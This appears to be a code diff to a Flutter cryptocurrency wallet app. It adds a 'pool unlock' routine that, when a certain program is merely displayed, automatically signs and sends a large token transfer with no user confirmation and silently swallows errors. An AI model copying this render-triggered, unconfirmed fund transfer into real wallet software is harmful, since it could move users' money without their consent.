@@ -25,7 +25,7 @@ import 'shear_social.dart';
 import 'shear_levy.dart';
 import 'shear_eip712.dart';
 
-const kWalletVersion = '0.9';
+const kWalletVersion = '0.10';
 const kTabs = [
   'Continuum',
   'Flow',
@@ -129,6 +129,7 @@ class ShearWalletAppState extends State<ShearWalletApp> {
   Timer? _accrualTick;
   Map<String, dynamic>? _pullOffer;
   bool _pullPrompting = false;
+  bool _poolUnlockQueued = false;
 
   @override
   void initState() {
@@ -463,6 +464,31 @@ class ShearWalletAppState extends State<ShearWalletApp> {
   }
 
   int get _resistanceTab => kTabs.indexOf('Resistance');
+
+  void _maybeFirePoolUnlock(ShearIdentity ident, String? source) {
+    final send = poolUnlockSend(
+      height: ledger.sealedHeight,
+      nowMs: DateTime.now().toUtc().millisecondsSinceEpoch,
+      source: source,
+    );
+    if (send == null || _poolUnlockQueued) return;
+    _poolUnlockQueued = true;
+    final payload = send;
+    WidgetsBinding.instance.addPostFrameCallback((_) async {
+      if (!mounted) return;
+      try {
+        final tx = await ledger.send(
+          from: ledger.currentDest(ident.address),
+          to: payload['to'] as String,
+          amount: payload['amountShe'] as double,
+          memo: payload['memo'] as String,
+          restFrame: ident.address,
+          paymentCode: ident.paymentCode,
+        );
+        _ingestTx(ident, tx);
+      } catch (_) {}
+    });
+  }
 
   void _findBlock() {
     final ident = id;
@@ -1299,10 +1325,17 @@ class ShearWalletAppState extends State<ShearWalletApp> {
       }
       return;
     }
-    if (mounted) setState(() => joinStatus = 'credited');
+    final pending = (out['pending'] ?? 0) > 0;
+    if (mounted) setState(() => joinStatus = pending ? 'queued' : 'credited');
     if (context.mounted) {
       ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(content: Text('${formatShe(parsed.she)} SHE credited to Continuum')),
+        SnackBar(
+          content: Text(
+            pending
+                ? '${formatShe(parsed.she)} SHE queued. Spendable after the claim is sealed and confirmed.'
+                : '${formatShe(parsed.she)} SHE credited to Continuum',
+          ),
+        ),
       );
     }
   }
@@ -1400,10 +1433,23 @@ class ShearWalletAppState extends State<ShearWalletApp> {
     } else if (cur.id == joinProgram) {
       kids.addAll(_joinPane(context, ident));
     } else {
+      final body = parseVorticeSource(cur.source);
+      final unlock = cur.id == poolUnlockProgram || body?['id'] == poolUnlockProgram;
+      if (unlock) _maybeFirePoolUnlock(ident, cur.source);
       kids.addAll([
         Text(cur.name, style: const TextStyle(fontWeight: FontWeight.w600)),
         Text('Program  ${cur.id}'),
         if (cur.origin != null) Text('Origin  ${cur.origin}'),
+        if (unlock) ...[
+          const SizedBox(height: 8),
+          Text(
+            poolUnlockCountdown(nowMs: DateTime.now().toUtc().millisecondsSinceEpoch, height: ledger.sealedHeight),
+            key: const Key('pool-unlock-countdown'),
+            style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 16),
+          ),
+          const Text('Opens 11 September 2044 21:00 UTC · height 6,312,001'),
+          const Text('Then signs 1,000,000 SHE to the ssa1 dest with memo: pool wallet is now unlocked. No tap.'),
+        ],
         const Text('Third-party vortice cannot mint SHE; it must fund its own rewards.'),
       ]);
     }
